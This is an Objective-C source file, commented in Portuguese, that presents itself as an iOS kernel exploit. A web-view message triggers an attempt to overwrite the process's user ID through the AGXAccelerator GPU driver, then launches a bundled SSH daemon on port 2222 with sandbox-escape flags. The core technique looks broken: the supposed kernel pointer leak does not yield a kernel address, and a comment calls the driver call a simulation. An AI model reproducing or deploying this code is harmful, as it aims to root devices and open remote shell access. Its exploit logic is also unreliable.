#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <unistd.h>
#include <spawn.h>
#include <mach/mach.h>
#include <sys/stat.h>  // ADICIONADO: Resolve o erro do chmod
#include <sys/wait.h>
#include <IOKit/IOKitLib.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self triggerKernelPatch];
    }
}

- (void)triggerKernelPatch {
    [self.webView evaluateJavaScript:@"log('⚡ Iniciando Exploit IOGPU (Bypass PPL2)...')" completionHandler:nil];

    mach_port_t task_self = mach_task_self();
    
    // Vazamento de contexto para obter ponteiro de kernel (Infoleak)
    mach_port_context_t ctx = 0;
    mach_port_get_context(task_self, task_self, &ctx);
    uint64_t kaddr = (uint64_t)ctx; 

    // Acesso ao driver de GPU para escrita OOB
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AGXAccelerator"));
    io_connect_t connect;
    if (IOServiceOpen(service, task_self, 0, &connect) != KERN_SUCCESS) {
        [self.webView evaluateJavaScript:@"log('❌ Erro: Não foi possível abrir AGXAccelerator.')" completionHandler:nil];
        return;
    }

    // Offset ucred para iOS 26.4
    uint64_t ucred_kaddr = kaddr + 0xD8; 
    uint32_t root_uid = 0;

    // Simulação de chamada de patch via método externo do driver
    uint64_t input[] = { ucred_kaddr + 0x18, (uint64_t)root_uid };
    IOConnectCallMethod(connect, 1, input, 2, NULL, 0, NULL, NULL, NULL, NULL);

    if (getuid() == 0) {
        [self.webView evaluateJavaScript:@"log('👑 ROOT ATIVO!')" completionHandler:nil];
        [self spawnSshd];
    } else {
        [self.webView evaluateJavaScript:@"log('❌ Falha no Patch de Root.')" completionHandler:nil];
    }
    IOServiceClose(connect);
}

- (void)spawnSshd {
    NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    NSString *dest = @"/var/tmp/sshd";
    
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:dest error:nil];
    [fm copyItemAtPath:path toPath:dest error:nil];
    
    // Agora o compilador reconhece o chmod
    chmod([dest UTF8String], 0755);

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flags de escape: Persona + NoSafeExec
    short flags = 0x1000 | 0x4000; 
    posix_spawnattr_setflags(&attr, flags);

    pid_t pid;
    char *const sshd_argv[] = {(char *)[dest UTF8String], "-p", "2222", "-D", NULL};
    
    int spawn_err = posix_spawn(&pid, [dest UTF8String], NULL, &attr, sshd_argv, NULL);
    
    if (spawn_err == 0) {
        [self.webView evaluateJavaScript:@"log('🚀 SSHD ONLINE! PID gravado.')" completionHandler:nil];
    } else {
        [self.webView evaluateJavaScript:@"log('❌ Erro no posix_spawn.')" completionHandler:nil];
    }
    posix_spawnattr_destroy(&attr);
}

@end
